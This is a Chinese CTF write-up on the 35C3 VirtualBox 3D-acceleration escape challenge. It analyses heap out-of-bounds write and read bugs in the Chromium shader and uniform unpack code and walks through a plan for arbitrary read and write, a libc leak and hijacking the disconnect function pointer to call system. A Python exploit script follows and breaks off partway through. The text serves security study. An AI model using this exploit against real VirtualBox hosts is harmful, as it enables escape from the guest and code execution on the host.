<div class="title-image"><img src="https://pic2.zhimg.com/v2-e05fb9386d014f04628ac1a470d56f82_b.jpg" alt=""></div><p><b>作者:</b> <a class="member_mention" href="http://www.zhihu.com/people/1147d134e271d3e7428150977892bb51" data-hash="1147d134e271d3e7428150977892bb51" data-hovercard="p$b$1147d134e271d3e7428150977892bb51">@flyyy</a> </p><p><b>长亭科技安全研究员，曾获得GeekPwn 2018“最佳技术奖”，入选极棒名人堂。</b></p><blockquote>35C3CTF中niklasb出了一道关于virtualbox逃逸的0day题目，想从这个题目给大家介绍virtualbox的一个新的攻击面（其实类似的攻击面也同样存在于其他虚拟化类软件），这里记录一下和@kelwin一起解题的过程（被dalao带飞真爽）</blockquote><h2><b>题目描述</b></h2><div class="highlight"><pre><code class="language-text"><span></span>chromacity 477
Solves: 2
Please escape VirtualBox. 3D acceleration is enabled for your convenience.
​
No need to analyze the 6.0 patches, they should not contain security fixes.
​
Once you're done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.
​
Challenge files. Password for the encrypted VM image is the flag for "sanity check".
​
Setup
​
UPDATE: You might need to enable nested virtualization.
​
Hint: https://github.com/niklasb/3dpwn/ might be useful
​
Hint 2: this photo was taken earlier today at C3
​
Difficulty estimate: hard
</code></pre></div><p>    题目描述中可以看出：</p><ol><li>虚拟机配置中显卡开启了3D加速功能</li><li>6.0的patch没用，参考virtualbox 6.0的发布时间推测是出题人来不及用最新版适配环境等等，所以是一道0day题目</li></ol><p>    题目前前后后给出了四个附件，一个是img文件，一个是通过qemu+kvm虚拟机运行该img的.sh文件，这个虚拟机就是远程运行的host的环境，host当中有一个5.28 release版的virtualbox，也就是我们逃逸的目标。（算上启动host环境中的virtualbox，如果你的主机是windows+vmware workstation的话。。。满眼都是泪），另外还有两张图片，一张是关于目标virtualbox虚拟机的配置，一张是niklasb和他电脑屏幕的照片。电脑屏幕上显示的是<a href="http://link.zhihu.com/?target=https%3A//www.khronos.org/registry/OpenGL-Refpages/gl4/html/glShaderSource.xhtml" class=" wrap external" target="_blank" rel="nofollow noreferrer">这个页面</a>，看样子题目应该跟glShaderSource这个opengl的api有关。</p><p>    同时给出的两个hint，一个是niklasb自己关于3dpwn的github链接，其中有他之前通过攻击virtual box 3D加速模块实现逃逸的源码和相关<a href="http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry" class=" wrap external" target="_blank" rel="nofollow noreferrer">分析文章</a>。另一个就是附件中关于niklasb的照片。</p><h2><b>题目分析</b></h2><p>    通过题目描述我们可以比较确定的是出题人希望我们去找virtualbox 3D加速部分的0day漏洞来实现逃逸，同时通过他给出的github链接中的文章和题目名我们可以很快把目标锁定在3D加速部分的<a href="http://link.zhihu.com/?target=http%3A//chromium.sourceforge.net/" class=" wrap external" target="_blank" rel="nofollow noreferrer">Chromium</a>代码上（并不是同名的浏览器项目）。</p><p>    简单来说，virtualbox通过引入OpenGL的共享库来引入3D加速功能，而Chromium负责解析Virtualbox。Chromium定义了一套用来描述OpenGL不同操作的网络协议。但是这个Chromium库最后一次更新源码已经是在十二年前了。同时通过这个库我们大概可以猜到之前hint中那张照片的用意了。如果排除掉去直接挖掘OpenGL的0day的可能性，那Virtualbox代码中关于glShaderSource的部分就只有Chromium中关于这个api的协议解析的部分了。而恰好niklasb的github中的源码和文章都是关于Chromium部分的漏洞及其利用的。</p><h2><b>源码分析</b></h2><p>    Virtualbox的Guest additions类似于VMware workstation中的vmware-tools。不同的地方在于，VMware workstation通过暴漏固定的端口给guest来实现guest与host的通信，而Guest additions是通过增加一个自定义的虚拟硬件vboxguest来实现guest与host的交互。而3D加速是作为一个virtualbox自定义的hgcm服务进程存在的。</p><div class="highlight"><pre><code class="language-text"><span></span>gdb-peda$ i thread
  Id   Target Id         Frame 
* 1    Thread 0x7fe77f6d9780 (LWP 14933) "VirtualBoxVM" 0x00007fe77b0acbf9 in __GI___poll (fds=0x55fe988e82b0, nfds=0x2, timeout=0x63) at ../sysdeps/unix/sysv/linux/poll.c:29
......
  15   Thread 0x7fe72f86a700 (LWP 14965) "ShCrOpenGL" 0x00007fe77a4959f3 in futex_wait_cancelable (private=&lt;optimized out&gt;, expected=0x0, futex_word=0x7fe720004068)
......
  35   Thread 0x7fe6d0cd6700 (LWP 14985) "nspr-3" 0x00007fe77a4959f3 in futex_wait_cancelable (private=&lt;optimized out&gt;, expected=0x0, futex_word=0x55fe9868ed70)
    at ../sysdeps/unix/sysv/linux/futex-internal.h:88
  36   Thread 0x7fe6b9b61700 (LWP 14986) "SHCLIP" 0x00007fe77b0acbf9 in __GI___poll (fds=0x7fe6b4000b20, nfds=0x2, timeout=0xffffffff) at ../sysdeps/unix/sysv/linux/poll.c:29
gdb-peda$ thread 15
[Switching to thread 15 (Thread 0x7fe72f86a700 (LWP 14965))]
#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&lt;optimized out&gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
88  ../sysdeps/unix/sysv/linux/futex-internal.h: No such file or directory.
gdb-peda$ bt
#0  0x00007fe77a4959f3 in futex_wait_cancelable (private=&lt;optimized out&gt;, expected=0x0, futex_word=0x7fe720004068) at ../sysdeps/unix/sysv/linux/futex-internal.h:88
#1  __pthread_cond_wait_common (abstime=0x0, mutex=0x7fe720004070, cond=0x7fe720004040) at pthread_cond_wait.c:502
#2  __pthread_cond_wait (cond=0x7fe720004040, mutex=0x7fe720004070) at pthread_cond_wait.c:655
#3  0x00007fe77e0e5cc8 in rtSemEventWait (fAutoResume=0x1, cMillies=0xffffffff, hEventSem=0x7fe720004040)
    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:369
#4  RTSemEventWait (hEventSem=0x7fe720004040, cMillies=0xffffffff) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/linux/../posix/semevent-posix.cpp:482
#5  0x00007fe75d3b09aa in HGCMThread::MsgGet (this=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:549
#6  0x00007fe75d3b147f in hgcmMsgGet (pThread=0x7fe720003f60, ppMsg=0x7fe72f869cf0) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:734
#7  0x00007fe75d3b265c in hgcmServiceThread (pThread=0x7fe720003f60, pvUser=0x7fe720003e00) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCM.cpp:608
#8  0x00007fe75d3af940 in hgcmWorkerThreadFunc (hThreadSelf=0x7fe720004340, pvUser=0x7fe720003f60) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Main/src-client/HGCMThread.cpp:200
#9  0x00007fe77df95501 in rtThreadMain (pThread=0x7fe720004340, NativeThread=0x7fe72f86a700, pszThreadName=0x7fe720004c20 "ShCrOpenGL")
    at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/common/misc/thread.cpp:719
#10 0x00007fe77e0df882 in rtThreadNativeMain (pvArgs=0x7fe720004340) at /home/f1yyy/Desktop/VirtualBox-6.0.0/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
#11 0x00007fe77a48f6db in start_thread (arg=0x7fe72f86a700) at pthread_create.c:463
#12 0x00007fe77b0b988f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:95
​
</code></pre></div><p>    也就是说，当我们想要在guest中想要调用一个OpenGL的某个接口，需要根据我们的请求先进行Chromium的协议封装，再进行hgcm的协议封装。具体关于virtualbox在这两部分的实现细节，请阅读virtualbox相关源码，这里不再详述。</p><p>    niklasb在其github上已经封装好了调用Chromium代码部分的函数及例子,比如下面这两行代码：</p><div class="highlight"><pre><code class="language-text"><span></span>client = hgcm_connect("VBoxSharedCrOpenGL")
hgcm_call(client, SHCRGL_GUEST_FN_SET_VERSION, [9, 1])
</code></pre></div><p>    最终在源码中会触发到src/vbox/hostservices/sharedopengl/crservice/crservice.cpp中的switch下的SHCRGL_GUEST_FN_SET_VERSION部分，其中的vMajor和vMinor会分别为9和1。         </p><p>    再次回到题目上来，题目已经提醒了漏洞存在的位置可能在Chromium中glShaderSource相关的接口位置，通过在源码中的寻找与分析，我们把目标锁定在了crUnpackExtendShaderSource函数中。crUnpackExtendShaderSource代码如下：</p><div class="highlight"><pre><code class="language-c"><span></span><span class="kt">void</span> <span class="nf">crUnpackExtendShaderSource</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">GLint</span> <span class="o">*</span><span class="n">length</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">GLuint</span> <span class="n">shader</span> <span class="o">=</span> <span class="n">READ_DATA</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">GLuint</span><span class="p">);</span>
    <span class="n">GLsizei</span> <span class="n">count</span> <span class="o">=</span> <span class="n">READ_DATA</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">GLsizei</span><span class="p">);</span>
    <span class="n">GLint</span> <span class="n">hasNonLocalLen</span> <span class="o">=</span> <span class="n">READ_DATA</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">GLsizei</span><span class="p">);</span>
    <span class="n">GLint</span> <span class="o">*</span><span class="n">pLocalLength</span> <span class="o">=</span> <span class="n">DATA_POINTER</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">GLint</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">**</span><span class="n">ppStrings</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">GLsizei</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">jUpTo</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pos</span><span class="p">,</span> <span class="n">pos_check</span><span class="p">;</span>
<span class="err">​</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;=</span> <span class="n">UINT32_MAX</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">crError</span><span class="p">(</span><span class="s">"crUnpackExtendShaderSource: count %u is out of range"</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
<span class="err">​</span>
    <span class="n">pos</span> <span class="o">=</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">pLocalLength</span><span class="p">);</span>
<span class="err">​</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hasNonLocalLen</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">length</span> <span class="o">=</span> <span class="n">DATA_POINTER</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">GLint</span><span class="p">);</span>
        <span class="n">pos</span> <span class="o">+=</span> <span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">length</span><span class="p">);</span>
    <span class="p">}</span>
<span class="err">​</span>
    <span class="n">pos_check</span> <span class="o">=</span> <span class="n">pos</span><span class="p">;</span>
<span class="err">​</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">DATA_POINTER_CHECK</span><span class="p">(</span><span class="n">pos_check</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">crError</span><span class="p">(</span><span class="s">"crUnpackExtendShaderSource: pos %d is out of range"</span><span class="p">,</span> <span class="n">pos_check</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
<span class="err">​</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">pos_check</span> <span class="o">&gt;=</span> <span class="n">INT32_MAX</span> <span class="o">-</span> <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">DATA_POINTER_CHECK</span><span class="p">(</span><span class="n">pos_check</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">crError</span><span class="p">(</span><span class="s">"crUnpackExtendShaderSource: pos %d is out of range"</span><span class="p">,</span> <span class="n">pos_check</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
<span class="err">​</span>
        <span class="n">pos_check</span> <span class="o">+=</span> <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
<span class="err">​</span>
    <span class="n">ppStrings</span> <span class="o">=</span> <span class="n">crAlloc</span><span class="p">(</span><span class="n">count</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ppStrings</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
<span class="err">​</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ppStrings</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">DATA_POINTER</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="kt">char</span><span class="p">);</span>
        <span class="n">pos</span> <span class="o">+=</span> <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">length</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
<span class="err">​</span>
        <span class="n">Assert</span><span class="p">(</span><span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">jUpTo</span> <span class="o">=</span> <span class="n">i</span> <span class="o">==</span> <span class="n">count</span> <span class="o">-</span><span class="mi">1</span> <span class="o">?</span> <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">pLocalLength</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">jUpTo</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">char</span> <span class="o">*</span><span class="n">pString</span> <span class="o">=</span> <span class="n">ppStrings</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="err">​</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pString</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Assert</span><span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">jUpTo</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                <span class="n">pString</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="err">​</span>
<span class="c1">//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);</span>
    <span class="n">cr_unpackDispatch</span><span class="p">.</span><span class="n">ShaderSource</span><span class="p">(</span><span class="n">shader</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">**</span><span class="p">)</span><span class="n">ppStrings</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="err">​</span>
    <span class="n">crFree</span><span class="p">(</span><span class="n">ppStrings</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>    仔细看会发现在中间一段for循环检查pLocalLength数组的每个元素跟所有元素的和的大小是否越界时，并未检查最后一层循环过后pos_check是否越界，据此我们可以在最后的两层嵌套循环中的内层中实现越界写，而这个越界写也很有趣：</p><div class="highlight"><pre><code class="language-c"><span></span>        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">jUpTo</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">char</span> <span class="o">*</span><span class="n">pString</span> <span class="o">=</span> <span class="n">ppStrings</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="err">​</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pString</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Assert</span><span class="p">(</span><span class="n">j</span> <span class="o">==</span> <span class="n">jUpTo</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                <span class="n">pString</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div><p>    它可以将越界部分所有的'\0'替换为'\n'。通过这个漏洞我们可以越界写一块堆内存，将其后面内存中若干的'\0'替换为'\n'。（注意：Assert在release版中是不存在的！）之后我们会介绍如何通过这个越界写实现任意地址写。</p><p>    当然只有一个越界写可能利用起来还是十分困难，我们仔细看了看niklasb写的文章，发现在很多类似的unpack函数中均存在类似于CVE-2018-3055的漏洞，比如crUnpackExtendGetUniformLocation：</p><div class="highlight"><pre><code class="language-c"><span></span><span class="kt">void</span> <span class="nf">crUnpackExtendGetUniformLocation</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">packet_length</span> <span class="o">=</span> <span class="n">READ_DATA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
    <span class="n">GLuint</span> <span class="n">program</span> <span class="o">=</span> <span class="n">READ_DATA</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">GLuint</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">DATA_POINTER</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="p">);</span>
    <span class="n">SET_RETURN_PTR</span><span class="p">(</span><span class="n">packet_length</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>
    <span class="n">SET_WRITEBACK_PTR</span><span class="p">(</span><span class="n">packet_length</span><span class="o">-</span><span class="mi">8</span><span class="p">);</span>
    <span class="n">cr_unpackDispatch</span><span class="p">.</span><span class="n">GetUniformLocation</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>    漏洞的成因完全与CVE-2018-3055相同，简单来说SET_RETURN_PTR和SET_WRITEBACK_PTR指向的内存会写回到guest，而这里因为没有对packet_length做对应的检查导致我们可以在堆上实现越界读。</p><h2><b>漏洞利用</b></h2><p>    通过以上的代码分析，我们现在有一个堆越界读和一个堆越界写，接下来我们来分析如何去完成完整的漏洞利用。</p><p>    因为信息泄露部分完全与CVE-2018-3055基本相同，我们选择直接复用niklasb之前的exp leak部分的代码。重写make_oob_read后通过leak_stuff我们可以泄露一个CRConnection结构体的位置，而niklasb的exp中就是通过修改pHostBuffer和cbHostBuffer来实现任意地址读。因此，当我们有任意地址写的条件之后我们就可以任意地址读了。</p><p>    接下来的关键就是如何用我们神奇的堆溢出来实现任意地址写了。@kelwin找到了一个很好用的结构体CRVBOXSVCBUFFER_t，也就是niklasb的代码中alloc_buf使用的结构体：</p><div class="highlight"><pre><code class="language-c"><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_CRVBOXSVCBUFFER_t</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">uiId</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">uiSize</span><span class="p">;</span>
    <span class="kt">void</span><span class="o">*</span>    <span class="n">pData</span><span class="p">;</span>
    <span class="n">_CRVBOXSVCBUFFER_t</span> <span class="o">*</span><span class="n">pNext</span><span class="p">,</span> <span class="o">*</span><span class="n">pPrev</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CRVBOXSVCBUFFER_t</span><span class="p">;</span>
</code></pre></div><p>    如果可以在堆上我们可以越界写的内存后面恰好布置这样一个结构体，越界写它对应的uiSize部分，再通过SHCRGL_GUEST_FN_WRITE_BUFFER就可以越界写这个buffer所对应的pData的内容，之后再越界写另一个相同的结构体，就可以实现任意地址写了。实现任意地址写的具体过程如下：</p><p>1.n次调用alloc_buf，对应的buffer填充为可以触发越界写的部分，从而确保在我们可以越界写的堆后有可用的CRVBOXSVCBUFFER_t结构体。此时内存分布如下：</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg" data-caption="" data-size="normal" data-rawwidth="1028" data-rawheight="742" class="origin_image zh-lightbox-thumb" width="1028" data-original="https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg"></noscript><img src="https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg" data-caption="" data-size="normal" data-rawwidth="1028" data-rawheight="742" class="origin_image zh-lightbox-thumb lazy" width="1028" data-original="https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-734d5f102595b96f81d280832ca980cf_b.jpg"></figure><p>2.通过SHCRGL_GUEST_FN_WRITE_READ使用第n-3个buffer，触发堆越界写，覆盖掉第n-2个buffer的size部分。此时内存分布如下：</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg" data-caption="" data-size="normal" data-rawwidth="1014" data-rawheight="742" class="origin_image zh-lightbox-thumb" width="1014" data-original="https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg"></noscript><img src="https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg" data-caption="" data-size="normal" data-rawwidth="1014" data-rawheight="742" class="origin_image zh-lightbox-thumb lazy" width="1014" data-original="https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-d44646dfcd843d562b806fb8afb6faa7_b.jpg"></figure><p>3.通过SHCRGL_GUEST_FN_WRITE使用第n-2个buffer，触发堆越界写，可以修改第n-1个buffer的uiSize和pData为任意值。此时内存分布如下：</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg" data-caption="" data-size="normal" data-rawwidth="1110" data-rawheight="738" class="origin_image zh-lightbox-thumb" width="1110" data-original="https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg"></noscript><img src="https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg" data-caption="" data-size="normal" data-rawwidth="1110" data-rawheight="738" class="origin_image zh-lightbox-thumb lazy" width="1110" data-original="https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-70051b611de89a259054b033c1bd8d38_b.jpg"></figure><p>4.通过SHCRGL_GUEST_FN_WRITE使用第n-1个buffer，触发任意地址写，写的地址与长度由步骤3控制</p><p>5.多次任意地址写可以通过多次反复SHCRGL_GUEST_FN_WRITE第n-2个buffer和第n-1个buffer实现</p><p>    在有了任意读和任意写的能力之后，我们可以修改某个CRConnection结构体中disconnect函数指针来劫持rip，通过修改CRConnection头部的数据可以控制对应的参数。所以漏洞利用的完整过程如下：</p><ol><li>通过越界读泄露一个CRConnection结构体的位置</li><li>配置内存实现任意地址写</li><li>通过任意地址读泄露CRConnection结构体中alloc函数对应地址</li><li>通过alloc函数地址计算VBoxOGLhostcrutil.so库地址，最终泄露libc地址</li><li>修改CRConnection的disconnect函数指针为system</li><li>修改CRConnection的头部为payload</li><li>disconnect对应的client</li></ol><p>完整exp：</p><div class="highlight"><pre><code class="language-python"><span></span><span class="ch">#!/usr/bin/env python2</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">array</span> <span class="kn">import</span> <span class="n">array</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span><span class="p">,</span> <span class="n">unpack</span>
<span class="err">​</span>
<span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span> <span class="o">+</span> <span class="s1">'/lib'</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">chromium</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hgcm</span> <span class="kn">import</span> <span class="o">*</span>
<span class="err">​</span>
<span class="k">def</span> <span class="nf">make_oob_read</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span>
        <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;III"</span><span class="p">,</span> <span class="n">CR_MESSAGE_OPCODES</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="o">+</span> <span class="s1">'</span><span class="se">\0\0\0</span><span class="s1">'</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CR_EXTEND_OPCODE</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="n">CR_GETUNIFORMLOCATION_EXTEND_OPCODE</span><span class="p">)</span>
        <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s2">"&lt;I"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="o">+</span> <span class="s1">'LEET'</span>
        <span class="p">)</span>
<span class="err">​</span>
<span class="k">def</span> <span class="nf">leak_conn</span><span class="p">(</span><span class="n">client</span><span class="p">):</span>
    <span class="sd">''' Return a CRConnection address, and the associated client handle '''</span>
    <span class="c1"># Spray some buffers of sizes</span>
    <span class="c1">#  0x290 = sizeof(CRConnection) and</span>
    <span class="c1">#  0x9d0 = sizeof(CRClient)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">600</span><span class="p">):</span>
        <span class="n">alloc_buf</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x290</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">600</span><span class="p">):</span>
        <span class="n">alloc_buf</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x9d0</span><span class="p">)</span>
<span class="err">​</span>
    <span class="c1"># This will allocate a CRClient and CRConnection right next to each other.</span>
    <span class="n">new_client</span> <span class="o">=</span> <span class="n">hgcm_connect</span><span class="p">(</span><span class="s2">"VBoxSharedCrOpenGL"</span><span class="p">)</span>
<span class="err">​</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">alloc_buf</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x290</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">alloc_buf</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="mh">0x9d0</span><span class="p">)</span>
<span class="err">​</span>
    <span class="n">hgcm_disconnect</span><span class="p">(</span><span class="n">new_client</span><span class="p">)</span>
<span class="err">​</span>
    <span class="c1"># Leak pClient member of CRConnection struct, and from that compute</span>
